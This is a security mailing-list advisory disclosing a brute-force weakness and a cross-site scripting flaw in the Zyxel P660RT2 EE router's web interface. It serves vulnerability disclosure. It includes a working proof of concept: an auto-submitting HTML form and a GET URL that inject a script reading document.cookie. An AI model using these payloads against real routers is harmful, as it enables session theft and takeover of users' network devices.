Subject: [FD] BF and XSS vulnerabilities in Zyxel P660RT2 EE

Hello list!

These are Brute Force and Cross-Site Scripting vulnerabilities in Zyxel
P660RT2 EE ADSL Router.

-------------------------
Affected products:
-------------------------

Vulnerable is the next model: Zyxel P660RT2 EE. ZyNOS Firmware Version:
V3.40 (AXN.1). This model with other firmware versions also must be
vulnerable. Zyxel ignored all vulnerabilities in this device and still
didn't fix them.

----------
Details:
----------

Brute Force (WASC-11):

In login form http://192.168.1.1 there is no protection against Brute Force
attacks. Also there is no username, only password. And taking into account,
that password automatically is put into login form, then at access via LAN
there is no need to pick up password at all.

Cross-Site Scripting (WASC-08):

Attack is going via parameter with arbitrary name (as existent, as
fictitious, like with name "1" in this example and even without name in case
of GET request).

Zyxel P660RT2 EE XSS.html

<body onLoad="document.hack.submit()">
<form name="hack" action="http://192.168.1.1/Forms/rpAuth_1" method="post">
<input type="hidden" name="1" value="<body onload=alert(document.cookie)>">
</form>
</body>

XSS attack can be made as via POST, as via GET request:

http://192.168.1.1/Forms/rpAuth_1?=%3Cbody%20onload=alert(document.cookie)%3E

------------
Timeline:
------------ 

2014.04.11 - announced at my site. Later informed Zyxel, but vendor ignored.
2014.06.21 - disclosed at my site (http://websecurity.com.ua/7102/).
